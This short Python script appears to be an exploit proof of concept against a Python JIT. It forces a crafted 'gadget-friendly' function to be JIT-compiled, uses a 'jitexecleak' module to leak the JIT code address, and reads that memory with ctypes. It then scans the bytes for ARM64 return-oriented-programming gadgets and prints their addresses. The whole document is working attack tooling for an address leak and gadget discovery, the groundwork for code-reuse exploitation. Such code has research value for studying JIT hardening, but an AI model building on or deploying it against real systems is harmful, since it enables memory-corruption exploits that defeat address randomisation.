import ctypes
import jitexecleak

# Step 1: Gadget-friendly hot function
def gadget_loop(x, y):
    acc = 0
    for i in range(50000):
        acc ^= (x + i) * y
        if i % 17 == 0:
            acc += (x * i) ^ (y >> 2)
        elif i % 13 == 0:
            acc -= (y * 3)
        else:
            acc += i ^ x ^ y
    return acc

# Step 2: Trigger JIT
for _ in range(1000):
    gadget_loop(42, 17)

# Step 3: Leak JIT address
jit_addr = jitexecleak.leak_executor_jit(gadget_loop)
print(f"[+] executor->jit_code @ 0x{jit_addr:x}")

# Step 4: Read JIT memory
length = 0x100
mem = ctypes.string_at(jit_addr, length)

# Step 5: Define gadget patterns (ARM64)
gadgets = {
    b"\xc0\x03\x5f\xd6": "ret",           # ret
    b"\x00\x02\x1f\xd6": "br x16",        # branch
    b"\x50\x00\x00\x58": "ldr x16, [pc,#8]",  # trampoline load
    b"\x20\x00\x80\xd2": "mov x0, #1",
    b"\x00\x00\x80\xd2": "mov x0, #0",
}

# Step 6: Scan for gadgets
print(f"[*] Scanning 0x{jit_addr:x} - 0x{jit_addr + length:x}")
for i in range(0, len(mem) - 4, 4):
    instr = mem[i:i+4]
    if instr in gadgets:
        print(f"  [GADGET] {gadgets[instr]:<20} @ 0x{jit_addr + i:x}")
